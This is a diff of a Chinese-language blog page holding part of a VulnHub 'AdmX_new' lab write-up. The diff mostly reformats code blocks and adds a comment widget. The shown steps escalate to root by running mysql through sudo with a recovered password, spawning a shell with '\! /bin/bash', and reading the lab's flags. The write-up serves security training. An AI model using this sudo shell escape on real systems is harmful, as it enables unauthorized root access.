 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155043263.png" alt="image-20211117155043263"></p>
 <p>flag1:153495edec1b606c24947b1335998bd9</p>
-<h3 id="9-二次提权"><a href="#9-二次提权" class="headerlink" title="9.二次提权"></a>9.二次提权</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="9-二次提权"><a href="#9-二次提权" class="headerlink" title="9.二次提权"></a>9.二次提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
 <p>提示可以执行的命令：</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155135536.png" alt="image-20211117155135536"></p>
-<pre class="line-numbers language-none"><code class="language-none">sudo &#x2F;usr&#x2F;bin&#x2F;mysql -u root -D wordpress -p    #输入密码adam14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p    #输入密码adam14</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155339940.png" alt="image-20211117155339940"></p>
 <p>成功登录数据库</p>
 <h3 id="10-利用mysql数据库特性"><a href="#10-利用mysql数据库特性" class="headerlink" title="10.利用mysql数据库特性"></a>10.利用mysql数据库特性</h3><p>当前启动的数据库进程是具有root权限的，结合mysql数据库 system 命令 的功能</p>
-<pre class="line-numbers language-none"><code class="language-none">system id <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id </span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155440756.png" alt="image-20211117155440756"></p>
-<pre class="line-numbers language-none"><code class="language-none">\! &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155507429.png" alt="image-20211117155507429"></p>
 <p>成功获取root权限</p>
-<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">cat proof.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155542610.png" alt="image-20211117155542610"></p>
 <p>flag2:7efd721c8bfff2937c66235f2d0dbac1</p>
-</div></article></div></main><footer><div class="paginator"><a href="/2022/01/05/week5/" class="prev">上一篇</a><a href="/2022/01/04/week3/" class="next">下一篇</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
+</div></article></div></main><footer><div class="paginator"><a href="/2022/01/05/week5/" class="prev">上一篇</a><a href="/2022/01/04/week3/" class="next">下一篇</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'seansun';
+var disqus_identifier = '2022/01/05/week4/';
+var disqus_title = 'VulnHub-4-AdmX_new';
+var disqus_url = 'http://example.com/2022/01/05/week4/';
+(function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//seansun.disqus.com/count.js" async></script><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
